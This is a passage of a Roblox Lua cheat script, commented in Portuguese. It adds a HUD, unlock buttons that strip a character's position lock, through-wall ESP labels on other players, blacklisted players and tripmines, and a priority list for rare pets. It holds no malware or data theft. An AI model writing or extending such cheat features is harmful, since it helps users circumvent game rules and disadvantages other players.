        lblFps.Size               = UDim2.new(0, 74, 1, 0)

        lblFps.AnchorPoint        = Vector2.new(1, 0)

        lblFps.Position           = UDim2.new(1, -106, 0, 0)

        lblFps.BackgroundTransparency = 1

        lblFps.Text               = "FPS --"

        lblFps.Font               = Enum.Font.GothamBold

        lblFps.TextSize           = 14

        lblFps.TextColor3         = Color3.fromRGB(255, 255, 255)

        lblFps.TextTransparency   = 0.2

        lblFps.TextXAlignment     = Enum.TextXAlignment.Right

        -- Separador 1 (não usado no novo layout, mantido como placeholder invisível pra compat)

        local sep = Instance.new("TextLabel", bar)

        sep.Size               = UDim2.new(0, 0, 0, 0)

        sep.BackgroundTransparency = 1

        sep.Text               = ""

        sep.Font               = Enum.Font.GothamBold

        sep.TextSize           = 13

        sep.TextColor3         = Color3.fromRGB(120, 120, 120)

        sep.TextTransparency   = 1

        sep.Visible            = false

        -- ── Loop de atualização (1× por segundo, zero acumuladores extras) ──

        local frameCount = 0

        local elapsed    = 0

        RunService.Heartbeat:Connect(function(dt)

            if not bar.Parent then return end

            frameCount += 1

            elapsed    += dt

            if elapsed < 1 then return end

            local fps  = frameCount

            local ping = math.floor(LocalPlayer:GetNetworkPing() * 1000)

            -- Cores dinâmicas FPS

            local fpsColor

            if fps >= 55 then fpsColor = Color3.fromRGB(80, 230, 120)

            elseif fps >= 30 then fpsColor = Color3.fromRGB(255, 200, 60)

            else fpsColor = Color3.fromRGB(255, 80, 80) end

            -- Cores dinâmicas PING

            local pingColor

            if ping < 100 then pingColor = Color3.fromRGB(80, 230, 120)

            elseif ping < 200 then pingColor = Color3.fromRGB(255, 200, 60)

            else pingColor = Color3.fromRGB(255, 80, 80) end

            lblFps.Text       = "FPS " .. fps

            lblFps.TextColor3 = fpsColor

            lblPing.Text       = "PING " .. ping .. "ms"

            lblPing.TextColor3 = pingColor

            frameCount = 0

            elapsed    = 0

        end)

        -- Unlock buttons container (funcional, oculto por default)

        local unlockContainer = Instance.new("Frame", hudGui)

        unlockContainer.Name                  = "UnlockButtonsContainer"

        unlockContainer.Size                  = UDim2.new(0, 186, 0, 28)

        unlockContainer.AnchorPoint           = Vector2.new(0.5, 1)

        unlockContainer.Position              = UDim2.new(0.5, 0, 1, -112)

        unlockContainer.BackgroundTransparency = 1

        unlockContainer.BorderSizePixel       = 0

        unlockContainer.Visible               = Config.ShowUnlockButtonsHUD or false

        local uL = Instance.new("UIListLayout", unlockContainer)

        uL.FillDirection      = Enum.FillDirection.Horizontal

        uL.HorizontalAlignment = Enum.HorizontalAlignment.Center

        uL.VerticalAlignment  = Enum.VerticalAlignment.Center

        uL.Padding            = UDim.new(0, 4)

        -- Unlock buttons ─────────────────────────────────────────────────────

        -- Tamanho dos botões

        local BTN_W  = 42   -- andares 1/2/3

        local LOCK_W = 46   -- botão cadeado (um pouco maior)

        local BTN_H  = 34   -- altura comum (maior que antes)

        -- Helper botão de andar

        local function mkFloor(num, lo, lvl)

            local b = Instance.new("TextButton", unlockContainer)

            b.Size                   = UDim2.new(0, BTN_W, 0, BTN_H)

            b.BackgroundColor3       = Color3.fromRGB(10, 10, 14)

            b.BackgroundTransparency = 0.25

            b.Text                   = tostring(num)

            b.Font                   = Enum.Font.GothamBlack

            b.TextSize               = 12

            b.TextColor3             = Color3.fromRGB(200, 200, 200)

            b.BorderSizePixel        = 0

            b.AutoButtonColor        = false

            b.LayoutOrder            = lo

            Instance.new("UICorner", b).CornerRadius = UDim.new(0, 8)

            b.MouseButton1Click:Connect(function()

                -- flash sutil (não verde, só um clarão leve)

                local ot = b.BackgroundTransparency

                b.BackgroundTransparency = 0.05

                task.delay(0.15, function()

                    if b and b.Parent then b.BackgroundTransparency = ot end

                end)

                triggerClosestUnlock(lvl)

                ShowNotification("UNLOCK", "Andar " .. num)

            end)

        end

        -- ── Cadeado dourado (estilo imagem) ────────────────────────────────

        local lockBtn = Instance.new("TextButton", unlockContainer)

        lockBtn.Size                  = UDim2.new(0, LOCK_W, 0, BTN_H)

        lockBtn.BackgroundColor3      = Color3.fromRGB(10, 10, 14)

        lockBtn.BackgroundTransparency = 0.25

        lockBtn.Text                  = ""

        lockBtn.BorderSizePixel       = 0

        lockBtn.AutoButtonColor       = false

        lockBtn.LayoutOrder           = 1

        Instance.new("UICorner", lockBtn).CornerRadius = UDim.new(0, 8)

        -- Ícone cadeado limpo

        local GOLD  = Color3.fromRGB(215, 168, 42)

        local GREEN = Color3.fromRGB(75, 210, 105)

        local BG    = Color3.fromRGB(10, 10, 14)

        local CX    = LOCK_W // 2

        -- Shackle: 2 frames verticais + 1 horizontal no topo

        -- (posições absolutas, sem scale)

        local sL = Instance.new("Frame", lockBtn)

        sL.Size              = UDim2.new(0, 4, 0, 11)

        sL.Position          = UDim2.new(0, CX - 7, 0, 4)

        sL.BackgroundColor3  = GOLD

        sL.BackgroundTransparency = 0

        sL.BorderSizePixel   = 0

        Instance.new("UICorner", sL).CornerRadius = UDim.new(0, 2)

        local sR = Instance.new("Frame", lockBtn)

        sR.Size              = UDim2.new(0, 4, 0, 11)

        sR.Position          = UDim2.new(0, CX + 3, 0, 4)

        sR.BackgroundColor3  = GOLD

        sR.BackgroundTransparency = 0

        sR.BorderSizePixel   = 0

        Instance.new("UICorner", sR).CornerRadius = UDim.new(0, 2)

        local sT = Instance.new("Frame", lockBtn)

        sT.Size              = UDim2.new(0, 14, 0, 4)

        sT.Position          = UDim2.new(0, CX - 7, 0, 4)

        sT.BackgroundColor3  = GOLD

        sT.BackgroundTransparency = 0

        sT.BorderSizePixel   = 0

        Instance.new("UICorner", sT).CornerRadius = UDim.new(0, 2)

        -- Corpo

        local bd = Instance.new("Frame", lockBtn)

        bd.Size              = UDim2.new(0, 24, 0, 14)

        bd.Position          = UDim2.new(0, CX - 12, 0, 16)

        bd.BackgroundColor3  = GOLD

        bd.BackgroundTransparency = 0

        bd.BorderSizePixel   = 0

        Instance.new("UICorner", bd).CornerRadius = UDim.new(0, 4)

        -- Buraco

        local kh = Instance.new("Frame", bd)

        kh.Size              = UDim2.new(0, 5, 0, 5)

        kh.Position          = UDim2.new(0, 9, 0, 4)

        kh.BackgroundColor3  = BG

        kh.BackgroundTransparency = 0

        kh.BorderSizePixel   = 0

        Instance.new("UICorner", kh).CornerRadius = UDim.new(1, 0)

        local lockParts = {sL, sR, sT, bd}

        local function setLockState(unlocked)

            local col = unlocked and GREEN or GOLD

            for _, p in ipairs(lockParts) do p.BackgroundColor3 = col end

            sL.Position = unlocked

                and UDim2.new(0, CX - 3, 0, 4)

                or  UDim2.new(0, CX - 7, 0, 4)

            sT.Position = unlocked

                and UDim2.new(0, CX - 3, 0, 4)

                or  UDim2.new(0, CX - 7, 0, 4)

            sT.BackgroundTransparency = unlocked and 1 or 0

        end

        lockBtn.MouseButton1Click:Connect(function()

            _G.posUnlocked = true

            if _G.stopAutoBack then pcall(_G.stopAutoBack) end

            local char = LocalPlayer.Character

            local hrp  = char and char:FindFirstChild("HumanoidRootPart")

            if hrp then

                local bp = hrp:FindFirstChild("TP_BodyPosition")

                if bp then bp:Destroy() end

            end

            ShowNotification("UNLOCK", "Pos livre")

            -- Somente o ícone fica verde por 1s (fundo não muda)

            setLockState(true)

            task.delay(1, function() if lockBtn and lockBtn.Parent then setLockState(false) end end)

            task.delay(2.5, function() setLockState(false) end)

        end)

        -- Separador

        -- Andares 1 2 3

        local unlockLevels = {-2, 15, 32}

        for i = 1, 3 do

            mkFloor(i, i + 2, unlockLevels[i])

        end

        -- Ajusta tamanho do container

        unlockContainer.Size = UDim2.new(0, LOCK_W + 4 + 1 + 4 + BTN_W*3 + 4*2, 0, BTN_H)

        return hudGui

    end

    buildHUD()

    _G.rebuildStatusHUD = buildHUD

end)

task.spawn(function()

    local playerESPEnabled = Config.PlayerESP
    local playerBillboards = {}
    
    local function makePlayerBillboard(player)
        local bb = Instance.new("BillboardGui")
        bb.Name = "PlayerESP_"..tostring(player.UserId)
        bb.Size = UDim2.new(0, 100, 0, 20)
        bb.StudsOffsetWorldSpace = Vector3.new(0, 2.8, 0)
        bb.AlwaysOnTop = true; bb.LightInfluence = 0; bb.ResetOnSpawn = false
        local nameLbl = Instance.new("TextLabel", bb)
        nameLbl.Size = UDim2.new(1,0,1,0)
        nameLbl.BackgroundTransparency = 1
        nameLbl.Font = Enum.Font.GothamBlack; nameLbl.TextSize = 13
        nameLbl.TextColor3 = Color3.fromRGB(255,255,255)
        nameLbl.TextXAlignment = Enum.TextXAlignment.Center
        nameLbl.TextStrokeTransparency = 0.4
        nameLbl.TextStrokeColor3 = Color3.fromRGB(0,0,0)
        nameLbl.Text = player.Name
        return bb, nameLbl
    end

    local function getHRP(player)
        local char = player.Character; if not char then return nil end
        return char:FindFirstChild("HumanoidRootPart")
    end

    local function createOrRefresh(player)
        if player == LocalPlayer then return end
        local hrp = getHRP(player); if not hrp then return end
        local hum = player.Character:FindFirstChild("Humanoid")
        if hum then
            hum.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
        end
        local uid = player.UserId
        local entry = playerBillboards[uid]
        if not entry or not entry.bb or not entry.bb.Parent then
            if entry and entry.bb then pcall(function() entry.bb:Destroy() end) end
            local bb, nameLbl = makePlayerBillboard(player)
            bb.Adornee = hrp; bb.Parent = hrp
            playerBillboards[uid] = {bb=bb, nameLbl=nameLbl, player=player}
        else
            if entry.bb.Adornee ~= hrp then entry.bb.Adornee = hrp; entry.bb.Parent = hrp end
        end
    end

    local function clearAll()
        for uid, entry in pairs(playerBillboards) do
            if entry.bb and entry.bb.Parent then pcall(function() entry.bb:Destroy() end) end
            local p = Players:GetPlayerByUserId(uid)
            if p and p.Character then
                local h = p.Character:FindFirstChild("Humanoid")
                if h then h.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.Viewer end
            end
            playerBillboards[uid] = nil
        end
    end

    playerESPToggleRef.setFn = function(enabled)
        playerESPEnabled = enabled
        if not enabled then clearAll() end
    end

    task.spawn(function()
        while true do
            task.wait(0.5)
            if playerESPEnabled then
                for uid, entry in pairs(playerBillboards) do
                    if not Players:GetPlayerByUserId(uid) then
                        if entry.bb and entry.bb.Parent then pcall(function() entry.bb:Destroy() end) end
                        playerBillboards[uid] = nil
                    end
                end
                for _, player in ipairs(Players:GetPlayers()) do
                    if player ~= LocalPlayer then
                        pcall(createOrRefresh, player)
                    end
                end
            end
        end
    end)

    Players.PlayerAdded:Connect(function(p)
        p.CharacterAdded:Connect(function()
            task.wait(0.5)
            if playerESPEnabled then pcall(createOrRefresh, p) end
        end)
    end)
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer then
            p.CharacterAdded:Connect(function()
                task.wait(0.5)
                if playerESPEnabled then pcall(createOrRefresh, p) end
            end)
        end
    end
end)
task.spawn(function()

    local function makeBlacklistESP(player)

        local char = player.Character

        if not char then return end

        local hrp = char:FindFirstChild("HumanoidRootPart")

        if not hrp then return end

        local old = char:FindFirstChild("BullysBlacklistESP")

        if old then old:Destroy() end

        local msg = Config.BlacklistMsg or "BLOCKED"

        local bb = Instance.new("BillboardGui")

        bb.Name                  = "BullysBlacklistESP"

        bb.Size                  = UDim2.new(0, 120, 0, 22)

        bb.StudsOffsetWorldSpace = Vector3.new(0, 5.5, 0)  -- above regular ESP (2.8)

        bb.AlwaysOnTop           = true

        bb.LightInfluence        = 0

        bb.ResetOnSpawn          = false

        bb.Adornee               = hrp

        bb.Parent                = hrp

        local bg = Instance.new("Frame", bb)

        bg.Size                  = UDim2.new(1, 0, 1, 0)

        bg.BackgroundColor3      = Color3.fromRGB(8,8,12) or Color3.fromRGB(20, 15, 20)

        bg.BackgroundTransparency = 0.15

        bg.BorderSizePixel       = 0

        Instance.new("UICorner", bg).CornerRadius = UDim.new(1, 0)

        local lbl = Instance.new("TextLabel", bg)

        lbl.Name                 = "MsgLbl"

        lbl.Size                 = UDim2.new(1, -8, 1, 0)

        lbl.Position             = UDim2.new(0, 4, 0, 0)

        lbl.BackgroundTransparency = 1

        lbl.Text                 = " " .. msg

        lbl.Font                 = Enum.Font.GothamBlack

        lbl.TextSize             = 11

        lbl.TextColor3           = Color3.fromRGB(200,60,60) or Color3.fromRGB(255, 80, 80)

        lbl.TextXAlignment       = Enum.TextXAlignment.Center

        lbl.TextTruncate         = Enum.TextTruncate.AtEnd

        char.AncestryChanged:Connect(function()

            if not char.Parent then pcall(function() bb:Destroy() end) end

        end)

    end

    local function removeBlacklistESP(player)

        local char = player.Character

        if char then

            local bb = char:FindFirstChild("BullysBlacklistESP")

            if bb then bb:Destroy() end

        end

    end

    -- Expose so removeFromBlacklist can call it immediately

    _G.removeBlacklistESP = removeBlacklistESP

    -- Watch for player leaving and clean up ESP

    Players.PlayerRemoving:Connect(function(p)

        removeBlacklistESP(p)

    end)

    -- Watch for character respawn to re-apply ESP if still blacklisted

    Players.PlayerAdded:Connect(function(p)

        p.CharacterAdded:Connect(function()

            task.wait(0.5)

            if Config.BlacklistESP ~= false and isBlacklisted and isBlacklisted(p.Name) then

                makeBlacklistESP(p)

            end

        end)

    end)

    for _, p in ipairs(Players:GetPlayers()) do

        p.CharacterAdded:Connect(function()

            task.wait(0.5)

            if Config.BlacklistESP ~= false and isBlacklisted and isBlacklisted(p.Name) then

                makeBlacklistESP(p)

            end

        end)

    end

    -- Main loop

    while true do

        task.wait(0.5)

        if Config.BlacklistESP == false then continue end

        for _, p in ipairs(Players:GetPlayers()) do

            if p == LocalPlayer then continue end

            pcall(function()

                if isBlacklisted and isBlacklisted(p.Name) then

                    local char = p.Character

                    if char and not char:FindFirstChild("BullysBlacklistESP") then

                        makeBlacklistESP(p)

                    end

                else

                    removeBlacklistESP(p)

                end

            end)

        end

    end

end)

task.spawn(function()

    local subspaceMineESPToggleRef = {setFn=nil}
    local subspaceMineESPData = {}
    local FolderName = "ToolsAdds"

    local function getMineOwner(mineName)
        local ownerName = mineName:match("SubspaceTripmine(.+)")
        if not ownerName then return "Unknown" end
        local foundPlayer = Players:FindFirstChild(ownerName)
        return foundPlayer and foundPlayer.DisplayName or ownerName
    end

    local function createMineESP(mine)
        local ownerName = getMineOwner(mine.Name)
        local DANGER_COL = Color3.fromRGB(255, 40, 40)

        local selBox = Instance.new("SelectionBox")
        selBox.Name = "MineSB"
        selBox.Adornee = mine
        selBox.Color3 = DANGER_COL
        selBox.LineThickness = 0.05
        selBox.SurfaceColor3 = Color3.fromRGB(255, 20, 20)
        selBox.SurfaceTransparency = 0.8
        selBox.Parent = mine

        local bb = Instance.new("BillboardGui")
        bb.Name = "MineESP"
        bb.Adornee = mine
        bb.Size = UDim2.new(0, 160, 0, 42)
        bb.StudsOffset = Vector3.new(0, 3, 0)
        bb.AlwaysOnTop = true
        bb.LightInfluence = 0
        bb.MaxDistance = 400
        bb.Parent = mine

        local bg = Instance.new("Frame", bb)
        bg.Size = UDim2.new(1, 0, 1, 0)
        bg.BackgroundColor3 = Color3.fromRGB(12, 4, 4)
        bg.BackgroundTransparency = 0.1
        bg.BorderSizePixel = 0
        Instance.new("UICorner", bg).CornerRadius = UDim.new(0, 8)
        local bgStroke = Instance.new("UIStroke", bg)
        bgStroke.Color = DANGER_COL; bgStroke.Thickness = 1.5; bgStroke.Transparency = 0.2

        local title = Instance.new("TextLabel", bg)
        title.Size = UDim2.new(1, -10, 0, 14)
        title.Position = UDim2.new(0, 8, 0, 4)
        title.BackgroundTransparency = 1
        title.Text = "⚠ MINE"
        title.Font = Enum.Font.Ubuntu; title.TextSize = 10
        title.TextColor3 = DANGER_COL
        title.TextXAlignment = Enum.TextXAlignment.Left
        title.TextStrokeTransparency = 0.3; title.TextStrokeColor3 = Color3.new(0, 0, 0)

        local ownerLbl = Instance.new("TextLabel", bg)
        ownerLbl.Size = UDim2.new(1, -10, 0, 13)
        ownerLbl.Position = UDim2.new(0, 8, 0, 18)
        ownerLbl.BackgroundTransparency = 1
        ownerLbl.Text = ownerName
        ownerLbl.Font = Enum.Font.GothamBold; ownerLbl.TextSize = 10
        ownerLbl.TextColor3 = Color3.new(1, 1, 1)
        ownerLbl.TextXAlignment = Enum.TextXAlignment.Left
        ownerLbl.TextStrokeTransparency = 0.2; ownerLbl.TextStrokeColor3 = Color3.new(0, 0, 0)

        local distLbl = Instance.new("TextLabel", bg)
        distLbl.Name = "Dist"
        distLbl.Size = UDim2.new(0, 50, 0, 14)
        distLbl.Position = UDim2.new(1, -55, 0, 4)
        distLbl.BackgroundTransparency = 1
        distLbl.Text = "0m"
        distLbl.Font = Enum.Font.GothamBlack; distLbl.TextSize = 11
        distLbl.TextColor3 = Color3.fromRGB(255, 180, 50)
        distLbl.TextXAlignment = Enum.TextXAlignment.Right
        distLbl.TextStrokeTransparency = 0.3; distLbl.TextStrokeColor3 = Color3.new(0, 0, 0)

        return { selectionBox = selBox, billboardGui = bb, mine = mine, distLbl = distLbl }
    end

    local function refreshSubspaceMineESP()
        if not Config.SubspaceMineESP then
            for i, data in pairs(subspaceMineESPData) do
                
                if data.selectionBox and data.selectionBox.Parent then data.selectionBox:Destroy() end
                if data.billboardGui and data.billboardGui.Parent then data.billboardGui:Destroy() end
                subspaceMineESPData[i] = nil
            end
            return
        end
        local toolsFolder = Workspace:FindFirstChild(FolderName)
        if not toolsFolder then return end
        local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        local currentMines = {}
        for _, obj in pairs(toolsFolder:GetChildren()) do
            if obj.Name:match("^SubspaceTripmine") and obj:IsA("BasePart") then
                currentMines[obj] = true
                if not subspaceMineESPData[obj] then
                    subspaceMineESPData[obj] = createMineESP(obj)
                end
                if hrp and subspaceMineESPData[obj] and subspaceMineESPData[obj].distLbl then
                    local d = math.floor((hrp.Position - obj.Position).Magnitude)
                    subspaceMineESPData[obj].distLbl.Text = d .. "m away"
                    if d < 15 then
                        subspaceMineESPData[obj].distLbl.TextColor3 = Color3.fromRGB(255, 50, 50)
                    elseif d < 30 then
                        subspaceMineESPData[obj].distLbl.TextColor3 = Color3.fromRGB(255, 180, 50)
                    else
                        subspaceMineESPData[obj].distLbl.TextColor3 = Color3.fromRGB(100, 200, 100)
                    end
                end
            end
        end
        for mineObj, data in pairs(subspaceMineESPData) do
            if not currentMines[mineObj] or not mineObj.Parent then
                
                if data.selectionBox and data.selectionBox.Parent then data.selectionBox:Destroy() end
                if data.billboardGui and data.billboardGui.Parent then data.billboardGui:Destroy() end
                subspaceMineESPData[mineObj] = nil
            end
        end
    end

    if subspaceMineESPToggleRef then
        subspaceMineESPToggleRef.setFn = function(enabled)
            Config.SubspaceMineESP = enabled
            if not enabled then
                for _, data in pairs(subspaceMineESPData) do
                    
                if data.selectionBox and data.selectionBox.Parent then data.selectionBox:Destroy() end
                    if data.billboardGui and data.billboardGui.Parent then data.billboardGui:Destroy() end
                end
                table.clear(subspaceMineESPData)
            end
        end
    end

    while true do

        task.wait(0.5) 

        

        local success, errorMessage = pcall(refreshSubspaceMineESP)

    end

end)

task.spawn(function()

    local Packages = ReplicatedStorage:WaitForChild("Packages")

    local Datas = ReplicatedStorage:WaitForChild("Datas")

    

    local AnimalsData = require(Datas:WaitForChild("Animals"))

    

    local function getPetsByRarity(rarityName)

        local petList = {}

        for petName, data in pairs(AnimalsData) do

            if data.Rarity == rarityName and not petName:find("Lucky Block") then

                table.insert(petList, petName)

            end

        end

        table.sort(petList)

        return petList

    end

    local secretPets = {}

    local _seen = {}

    for _, rar in ipairs({"Secret","Divine","Legendary","Epic","Rare"}) do

        for _, nm in ipairs(getPetsByRarity(rar)) do

            if not _seen[nm:lower()] then _seen[nm:lower()]=true; table.insert(secretPets,nm) end

        end

    end

    table.sort(secretPets)

    

    local priorityGui = Instance.new("ScreenGui")

    priorityGui.Name = "PriorityListGUI"

    priorityGui.ResetOnSpawn = false

    priorityGui.Parent = PlayerGui

    priorityGui.Enabled = false

    

    local mainFrame = Instance.new("Frame")

    mainFrame.Size = UDim2.new(0, 650, 0, 600)

    mainFrame.Position = UDim2.new(0.5, -325, 0.5, -300)

    mainFrame.BackgroundColor3 = Color3.fromRGB(8,8,12)

    mainFrame.BackgroundTransparency = 0.05

    mainFrame.BorderSizePixel = 0

    mainFrame.ClipsDescendants = true

    mainFrame.Parent = priorityGui

    

    Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 8)

    

    local header = Instance.new("Frame", mainFrame)

    header.Size = UDim2.new(1, 0, 0, 40)

    header.BackgroundTransparency = 1

    MakeDraggable(header, mainFrame, nil)

    

    local titleLabel = Instance.new("TextLabel", header)

    titleLabel.Size = UDim2.new(0.6, 0, 1, 0)

    titleLabel.Position = UDim2.new(0, 15, 0, 0)

    titleLabel.BackgroundTransparency = 1

    titleLabel.Text = "PRIORITY LIST CUSTOMIZER"

    titleLabel.Font = Enum.Font.GothamBlack

    titleLabel.TextSize = 16

    titleLabel.TextColor3 = Color3.fromRGB(185,188,215)

    titleLabel.TextXAlignment = Enum.TextXAlignment.Left

    

    local closeBtn = Instance.new("TextButton", header)

    closeBtn.Size = UDim2.new(0, 80, 0, 30)

    closeBtn.Position = UDim2.new(1, -95, 0.5, 0)

    closeBtn.AnchorPoint = Vector2.new(0, 0.5)

    closeBtn.BackgroundColor3 = Color3.fromRGB(200,60,60)

    closeBtn.Text = "CLOSE"

    closeBtn.Font = Enum.Font.GothamBold

    closeBtn.TextSize = 12

    closeBtn.TextColor3 = Color3.new(1, 1, 1)

    Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 6)

    

    closeBtn.MouseButton1Click:Connect(function()

        priorityGui.Enabled = false

    end)

    

    local contentFrame = Instance.new("Frame", mainFrame)

    contentFrame.Size = UDim2.new(1, -30, 1, -100)

    contentFrame.Position = UDim2.new(0, 15, 0, 50)

    contentFrame.BackgroundTransparency = 1

    

    local availableLabel = Instance.new("TextLabel", contentFrame)

    availableLabel.Size = UDim2.new(0.45, 0, 0, 25)

    availableLabel.Position = UDim2.new(0, 0, 0, 0)

    availableLabel.BackgroundTransparency = 1

    availableLabel.Text = "AVAILABLE SECRET BRAINROTS"

    availableLabel.Font = Enum.Font.GothamBold

    availableLabel.TextSize = 12

    availableLabel.TextColor3 = Color3.fromRGB(120,122,155)

    

    local availableScroll = Instance.new("ScrollingFrame", contentFrame)

    availableScroll.Size = UDim2.new(0.45, 0, 1, -30)

    availableScroll.Position = UDim2.new(0, 0, 0, 30)

    availableScroll.BackgroundColor3 = Color3.fromRGB(14,14,20)

    availableScroll.BorderSizePixel = 0

    availableScroll.ScrollBarThickness = 0

    Instance.new("UICorner", availableScroll).CornerRadius = UDim.new(0, 8)

    

    local availablePadding = Instance.new("UIPadding", availableScroll)

    availablePadding.PaddingTop = UDim.new(0, 5)

    availablePadding.PaddingLeft = UDim.new(0, 5)

    availablePadding.PaddingRight = UDim.new(0, 5)

    availablePadding.PaddingBottom = UDim.new(0, 5)

    

    local availableListLayout = Instance.new("UIListLayout", availableScroll)

    availableListLayout.Padding = UDim.new(0, 5)

    availableListLayout.SortOrder = Enum.SortOrder.Name

    

    local priorityLabel = Instance.new("TextLabel", contentFrame)

    priorityLabel.Size = UDim2.new(0.45, 0, 0, 25)

    priorityLabel.Position = UDim2.new(0.55, 0, 0, 0)

    priorityLabel.BackgroundTransparency = 1

    priorityLabel.Text = "PRIORITY LIST"

    priorityLabel.Font = Enum.Font.GothamBold

    priorityLabel.TextSize = 12

    priorityLabel.TextColor3 = Color3.fromRGB(120,122,155)

    

    local priorityScroll = Instance.new("ScrollingFrame", contentFrame)

    priorityScroll.Size = UDim2.new(0.45, 0, 1, -30)

    priorityScroll.Position = UDim2.new(0.55, 0, 0, 30)

    priorityScroll.BackgroundColor3 = Color3.fromRGB(14,14,20)

    priorityScroll.BorderSizePixel = 0

    priorityScroll.ScrollBarThickness = 0

    Instance.new("UICorner", priorityScroll).CornerRadius = UDim.new(0, 8)

    

    local priorityPadding = Instance.new("UIPadding", priorityScroll)

    priorityPadding.PaddingTop = UDim.new(0, 5)

    priorityPadding.PaddingLeft = UDim.new(0, 5)

    priorityPadding.PaddingRight = UDim.new(0, 5)

    priorityPadding.PaddingBottom = UDim.new(0, 5)

    

    local priorityListLayout = Instance.new("UIListLayout", priorityScroll)

    priorityListLayout.Padding = UDim.new(0, 5)

    

    local priorityButtons = {}

    local availableButtons = {}

    

    local function updateScrollSizes()

        task.wait()

        availableScroll.CanvasSize = UDim2.new(0, 0, 0, availableListLayout.AbsoluteContentSize.Y + 10)

        priorityScroll.CanvasSize = UDim2.new(0, 0, 0, priorityListLayout.AbsoluteContentSize.Y + 10)

    end

    

    availableListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateScrollSizes)

    priorityListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateScrollSizes)

    

    local function refreshPriorityList()

        for _, btn in pairs(priorityButtons) do

            if btn and btn.Parent then

                btn:Destroy()

            end

        end

        priorityButtons = {}

        

        for i, petName in ipairs(PRIORITY_LIST) do

            local itemFrame = Instance.new("Frame")

            itemFrame.Size = UDim2.new(1, -10, 0, 35)

            itemFrame.BackgroundColor3 = Color3.fromRGB(22,22,35)

            itemFrame.BorderSizePixel = 0

            Instance.new("UICorner", itemFrame).CornerRadius = UDim.new(0, 6)

            itemFrame.Parent = priorityScroll

            

            local nameLabel = Instance.new("TextLabel", itemFrame)

            nameLabel.Size = UDim2.new(1, -110, 1, 0)

            nameLabel.Position = UDim2.new(0, 10, 0, 0)

            nameLabel.BackgroundTransparency = 1

            nameLabel.Text = petName

            nameLabel.Font = Enum.Font.GothamMedium

            nameLabel.TextSize = 12

            nameLabel.TextColor3 = Color3.fromRGB(185,188,215)

            nameLabel.TextXAlignment = Enum.TextXAlignment.Left

            nameLabel.TextTruncate = Enum.TextTruncate.AtEnd

            

            local upBtn = Instance.new("TextButton", itemFrame)

            upBtn.Size = UDim2.new(0, 25, 0, 25)

            upBtn.Position = UDim2.new(1, -100, 0.5, 0)

            upBtn.AnchorPoint = Vector2.new(0, 0.5)

            upBtn.BackgroundColor3 = Color3.fromRGB(14,14,20)

            upBtn.Text = "↑"

            upBtn.Font = Enum.Font.GothamBold

            upBtn.TextSize = 12

            upBtn.TextColor3 = Color3.new(0, 0, 0)

            Instance.new("UICorner", upBtn).CornerRadius = UDim.new(0, 4)

            

            local downBtn = Instance.new("TextButton", itemFrame)

            downBtn.Size = UDim2.new(0, 25, 0, 25)

            downBtn.Position = UDim2.new(1, -70, 0.5, 0)

            downBtn.AnchorPoint = Vector2.new(0, 0.5)

            downBtn.BackgroundColor3 = Color3.fromRGB(14,14,20)

            downBtn.Text = "↓"

            downBtn.Font = Enum.Font.GothamBold

            downBtn.TextSize = 12

            downBtn.TextColor3 = Color3.new(0, 0, 0)

            Instance.new("UICorner", downBtn).CornerRadius = UDim.new(0, 4)

            

            local removeBtn = Instance.new("TextButton", itemFrame)

            removeBtn.Size = UDim2.new(0, 35, 0, 25)

            removeBtn.Position = UDim2.new(1, -30, 0.5, 0)

            removeBtn.AnchorPoint = Vector2.new(0, 0.5)

            removeBtn.BackgroundColor3 = Color3.fromRGB(200,60,60)

            removeBtn.Text = "X"

            removeBtn.Font = Enum.Font.GothamBold

            removeBtn.TextSize = 12

            removeBtn.TextColor3 = Color3.new(1, 1, 1)

            Instance.new("UICorner", removeBtn).CornerRadius = UDim.new(0, 4)

            

            upBtn.MouseButton1Click:Connect(function()

                local currentIndex = nil

                for idx, pName in ipairs(PRIORITY_LIST) do

                    if pName == petName then

                        currentIndex = idx

                        break

                    end

                end

                if currentIndex and currentIndex > 1 then

                    PRIORITY_LIST[currentIndex], PRIORITY_LIST[currentIndex - 1] = PRIORITY_LIST[currentIndex - 1], PRIORITY_LIST[currentIndex]

                    savePriorityToConfig()

                    refreshPriorityList()

                    refreshAvailableList()

                end

            end)

            

            downBtn.MouseButton1Click:Connect(function()

                local currentIndex = nil

                for idx, pName in ipairs(PRIORITY_LIST) do

                    if pName == petName then

                        currentIndex = idx

                        break

                    end

                end

                if currentIndex and currentIndex < #PRIORITY_LIST then

                    PRIORITY_LIST[currentIndex], PRIORITY_LIST[currentIndex + 1] = PRIORITY_LIST[currentIndex + 1], PRIORITY_LIST[currentIndex]

                    savePriorityToConfig()

                    refreshPriorityList()

                    refreshAvailableList()

                end

            end)

            

            removeBtn.MouseButton1Click:Connect(function()

                for idx, pName in ipairs(PRIORITY_LIST) do

                    if pName == petName then

                        table.remove(PRIORITY_LIST, idx)

                        savePriorityToConfig()

                        refreshPriorityList()

                        refreshAvailableList()

                        break

                    end

                end

            end)

            

            table.insert(priorityButtons, itemFrame)

        end

        

        updateScrollSizes()

    end

    

    local function refreshAvailableList()

        for _, btn in pairs(availableButtons) do

            if btn and btn.Parent then

                btn:Destroy()

            end

        end

        availableButtons = {}

        

        for _, petName in ipairs(secretPets) do

            local itemFrame = Instance.new("Frame")

            itemFrame.Size = UDim2.new(1, -10, 0, 30)

            itemFrame.BackgroundColor3 = Color3.fromRGB(22,22,35)

            itemFrame.BorderSizePixel = 0

            Instance.new("UICorner", itemFrame).CornerRadius = UDim.new(0, 6)

            itemFrame.Parent = availableScroll

            

            local nameLabel = Instance.new("TextLabel", itemFrame)

            nameLabel.Size = UDim2.new(1, -50, 1, 0)

            nameLabel.Position = UDim2.new(0, 10, 0, 0)

            nameLabel.BackgroundTransparency = 1

            nameLabel.Text = petName

            nameLabel.Font = Enum.Font.GothamMedium

            nameLabel.TextSize = 11

            nameLabel.TextColor3 = Color3.fromRGB(185,188,215)

            nameLabel.TextXAlignment = Enum.TextXAlignment.Left

            nameLabel.TextTruncate = Enum.TextTruncate.AtEnd

            

            local addBtn = Instance.new("TextButton", itemFrame)

            addBtn.Size = UDim2.new(0, 40, 0, 25)

